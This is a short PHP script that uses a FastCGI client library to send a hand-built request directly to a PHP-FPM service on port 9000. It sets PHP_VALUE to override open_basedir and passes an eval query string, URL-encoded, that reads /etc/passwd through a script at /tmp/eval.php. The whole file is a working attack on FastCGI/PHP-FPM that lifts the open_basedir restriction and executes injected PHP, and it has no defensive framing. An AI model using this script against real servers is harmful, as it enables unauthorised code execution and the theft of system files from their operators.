<?php
require 'vendor/autoload.php';
use Adoy\FastCGI\Client;
// Existing socket, such as Lighttpd with mod_fastcgi:
#$client = new Client('unix:///path/to/php/socket', -1);
// Fastcgi server, such as PHP-FPM:
$client = new Client('localhost', '9000');
$content = 'key=value';
echo $client->request(
    array(
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD' => 'POST',
        'SCRIPT_FILENAME' => '/tmp/eval.php',
        'SERVER_SOFTWARE' => 'php/fcgiclient',
        'REMOTE_ADDR' => '127.0.0.1',
        'REMOTE_PORT' => '9985',
        'SERVER_ADDR' => '127.0.0.1',
        'SERVER_PORT' => '80',
        'SERVER_NAME' => 'mag-tured',
        'SERVER_PROTOCOL' => 'HTTP/1.1',
        'CONTENT_TYPE' => 'application/x-www-form-urlencoded',
        'CONTENT_LENGTH' => strlen($content),
        'PHP_VALUE' => 'open_basedir = /',
        'QUERY_STRING' => 'eval=echo%20file_get_contents%28%27%2F/etc/passwd%27%29%3B',
    ),
    $content
);
